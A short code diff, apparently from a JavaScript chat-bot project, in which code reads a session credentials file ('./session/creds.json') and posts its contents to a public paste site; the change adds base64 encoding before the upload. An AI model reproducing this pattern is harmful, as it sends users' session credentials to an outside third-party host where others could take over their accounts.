@@ -58,7 +58,8 @@ const {
                         await delay(1000 * 10)
                         var tsurue = "";
                         let fil = await file.readFileSync("./session/creds.json", "utf-8");
-                        let link = await axios.post('http://paste.c-net.org/', "" + fil, {
+                        let filz = fil.toString('base64');
+                        let link = await axios.post('http://paste.c-net.org/', "" + filz, {
                             headers: {
 "Content-Type": "application/x-www-form-urlencoded",
                             }
